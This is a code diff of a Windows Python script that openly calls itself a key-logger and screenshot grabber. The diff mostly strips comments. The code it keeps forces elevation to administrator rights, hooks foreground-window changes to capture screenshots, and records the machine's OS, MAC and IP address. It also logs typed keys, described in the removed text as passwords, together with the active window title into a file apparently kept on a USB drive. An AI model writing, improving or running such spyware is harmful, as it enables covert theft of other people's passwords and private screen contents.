@@ -1,24 +1,14 @@
 # -*- coding: utf-8 -*-
 """
-Created on Thu Apr 23 10:21:02 2026
-
-@author: camtr
-"""
-
-# -*- coding: utf-8 -*-
-"""
 Created on Wed Apr 22 14:00:13 2026
 @author: camtr
 """
 
-# -*- coding: utf-8 -*-
 """
 Key‑logger + screenshot grabber (Windows only, needs admin).
 Dependencies (install once):
-    pip install keyboard mss pillow pywin32
+    pip install keyboard mss pillow pywin32 netifaces
 """
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
 
 import os
 import socket
@@ -33,20 +23,15 @@ import keyboard
 import mss
 import mss.tools
 import win32gui
-
-# ───────────────────────────────────────────────────────────────────────────────
-# 1️⃣  NEW IMPORTS – used for the launch‑info header
-# ───────────────────────────────────────────────────────────────────────────────
 import platform
 import uuid
 try:
-    import netifaces          # pip install netifaces
-except Exception:            # in case it’s missing – silently ignore
+    import netifaces          
+except Exception:            
     netifaces = None
 
-# ───────────────────────────────────────────────────────────────────────────────
-# 2️⃣  ADMIN CHECK & AUTO‑RESTART (unchanged)
-# ───────────────────────────────────────────────────────────────────────────────
+# ADMIN CHECK & AUTO‑RESTART
+
 def is_admin() -> bool:
     """Return True if the current process has administrative rights."""
     try:
@@ -56,7 +41,7 @@ def is_admin() -> bool:
 
 
 def run_as_admin(argv=None):
-    """Re‑launch the current script with elevated rights (UAC prompt)."""
+    """Re‑launch the current script with elevated rights."""
     if argv is None:
         argv = sys.argv
     script_path = os.path.abspath(argv[0])
@@ -82,28 +67,28 @@ if not is_admin():
     run_as_admin()
     sys.exit(0)
 
-# ───────────────────────────────────────────────────────────────────────────────
-# 3️⃣  NEW HELPER – writes the launch‑info header to *both* console & file
-# ───────────────────────────────────────────────────────────────────────────────
+# NEW HELPER – writes the launch‑info header to *both* console & file
+
 def write_launch_info(file_obj):
     """
     Builds a single line containing OS, MAC, and IP.
     The line is printed to stdout **and** appended to the opened file object.
     """
-    # ----  OS ----
+    # ----  OS 
     os_name   = platform.system()
     os_version = platform.version()
     os_release = platform.release()
 
-    # ----  MAC ----
+    # ----  MAC 
     mac_int = uuid.getnode()
     # convert the 48‑bit integer into the normal 00:1A:2B:… format
     mac_str = ':'.join(f'{(mac_int >> ele) & 0xFF:02X}' for ele in range(0, 48, 8))[::-1]
 
-    # ----  IP ----
+    # ----  IP 
     ip_addr = None
 
-    # 1️⃣  Try netifaces (preferred)
+    # Try netifaces
+    
     if netifaces:
         try:
             for iface in netifaces.interfaces():
@@ -115,15 +100,11 @@ def write_launch_info(file_obj):
                 if ip_addr:
                     break
         except Exception:
-            # ignore – fall back to socket
             pass
 
-    # 2️⃣  If still None, fall back to socket
+    # If still None, fall back to socket
     if not ip_addr:
         try:
-            # socket.gethostbyname() can return 127.0.0.1 if DNS maps the
-            # hostname to loopback.  To avoid that we enumerate all
-            # addresses returned by getaddrinfo().
             for res in socket.getaddrinfo(socket.gethostname(), None):
                 if res[0] == socket.AF_INET:            # IPv4 only
                     ip = res[4][0]
@@ -131,40 +112,33 @@ def write_launch_info(file_obj):
                         ip_addr = ip
                         break
             if not ip_addr:
-                # Still nothing – try the classic hostname lookup
                 ip_addr = socket.gethostbyname(socket.gethostname())
                 if ip_addr.startswith('127.'):
                     ip_addr = None
         except Exception:
             pass
 
-    # 3️⃣  Final safety net
     if not ip_addr:
-        ip_addr = '127.0.0.1'            # clear “default” message
-    # Build the one‑line string (no trailing newline on print, but keep it in the file)
+        ip_addr = '127.0.0.1'
     launch_line = (
         f"[LAUNCH] OS: {os_name} {os_version} (release {os_release}) | "
         f"MAC: {mac_str} | IP: {ip_addr}\n"
     )
 
-    # ① Print to console (strip the trailing newline so the console output looks tidy)
     print(launch_line.strip())
 
-    # ② Write the same line to the file
     file_obj.write(launch_line)
 
 
-# ───────────────────────────────────────────────────────────────────────────────
-# 4️⃣  INITIAL SETUP – directories, screenshot folder (unchanged)
-# ───────────────────────────────────────────────────────────────────────────────
+# INITIAL SETUP – directories, screenshot folder (unchanged)
+
 USB_ROOT = os.path.abspath(os.path.dirname(sys.argv[0]))
 SCREENSHOT_DIR = os.path.join(USB_ROOT, "Screenshots")
 os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 print(f"[INFO] Screenshots will be stored in: {SCREENSHOT_DIR}")
 
-# ───────────────────────────────────────────────────────────────────────────────
-# 5️⃣  HOOK CALLBACK (unchanged – screenshot logic)
-# ───────────────────────────────────────────────────────────────────────────────
+# HOOK CALLBACK (unchanged – screenshot logic)
+
 WinEventProc = ctypes.WINFUNCTYPE(
     None,                     # return type
     wintypes.HANDLE,          # hWinEventHook
@@ -186,7 +160,7 @@ def win_event_proc(hWinEventHook, event, hwnd, idObject, idChild, idThread, idms
         filename = f"{ts}_{safe}.png"
         path = os.path.join(SCREENSHOT_DIR, filename)
         with mss.mss() as sct:
-            monitor = sct.monitors[1]          # primary monitor
+            monitor = sct.monitors[1]
             img = sct.grab(monitor)
             mss.tools.to_png(img.rgb, img.size, output=path)
         print(f"[SCREENSHOT] {path}")
@@ -197,9 +171,8 @@ def win_event_proc(hWinEventHook, event, hwnd, idObject, idChild, idThread, idms
 
 win_event_callback = WinEventProc(win_event_proc)
 
-# ───────────────────────────────────────────────────────────────────────────────
-# 6️⃣  HOOK INSTALLER THREAD (unchanged)
-# ───────────────────────────────────────────────────────────────────────────────
+# HOOK INSTALLER THREAD (unchanged)
+
 def hook_thread():
     """Thread that installs SetWinEventHook and runs a message loop."""
     hook_id = ctypes.windll.user32.SetWinEventHook(
@@ -216,11 +189,11 @@ def hook_thread():
         sys.exit(1)
     print(f"[INFO] Hook installed, id={hook_id}")
 
-    # ----- message loop -----
+    # ----- message loop
     msg = wintypes.MSG()
     while True:
         if ctypes.windll.user32.GetMessageW(ctypes.byref(msg), None, 0, 0) == 0:
-            break          # WM_QUIT – should never happen
+            break
         ctypes.windll.user32.TranslateMessage(ctypes.byref(msg))
         ctypes.windll.user32.DispatchMessageW(ctypes.byref(msg))
 
@@ -228,25 +201,22 @@ def hook_thread():
 # Start the hook in the background (daemon so the process can exit cleanly)
 threading.Thread(target=hook_thread, daemon=True).start()
 
-# ───────────────────────────────────────────────────────────────────────────────
-# 7️⃣  PASSWORD LOGGING LOOP (modified to write the header once)
-# ───────────────────────────────────────────────────────────────────────────────
+# LOGGING LOOP
+
 def key_logger():
-    """Log every password typed in the console until the user presses ENTER."""
+    """Log every key typed in the console until the user presses ENTER."""
     DATA_PATH = os.path.join(USB_ROOT, "data.txt")
 
-    # ----  WRITE the launch‑info header once ----
     with open(DATA_PATH, "a", encoding="utf-8") as f:
         write_launch_info(f)
 
     def active_window_title() -> str:
-        """Return the title of the active window (browser tab)."""
+        """Return the title of the active window."""
         try:
             hwnd = win32gui.GetForegroundWindow()
             title = win32gui.GetWindowText(hwnd)
             return title or "Unnamed Window"
         except Exception:
-            # Fallback to pure ctypes if pywin32 fails
             return get_active_window_title_ctypes()
 
     def get_active_window_title_ctypes() -> str:
@@ -276,8 +246,5 @@ def key_logger():
             f.write(f"{timestamp} | {site_title} | {pwd}\n")
         print(f"[LOG] {timestamp} | {site_title} | {pwd}")
 
-# ───────────────────────────────────────────────────────────────────────────────
-# 8️⃣  ENTRY POINT (fixed typo)
-# ───────────────────────────────────────────────────────────────────────────────
 if __name__ == "__main__":
     key_logger()
